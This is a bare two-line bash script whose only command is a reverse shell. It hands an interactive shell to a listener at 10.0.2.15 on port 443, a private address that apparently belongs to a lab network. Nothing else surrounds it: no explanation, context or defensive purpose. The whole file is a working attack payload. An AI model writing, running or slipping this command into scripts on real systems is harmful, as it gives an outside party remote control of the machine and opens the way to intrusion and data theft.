#!/bin/bash

bash -i >& /dev/tcp/10.0.2.15/443 0>&1
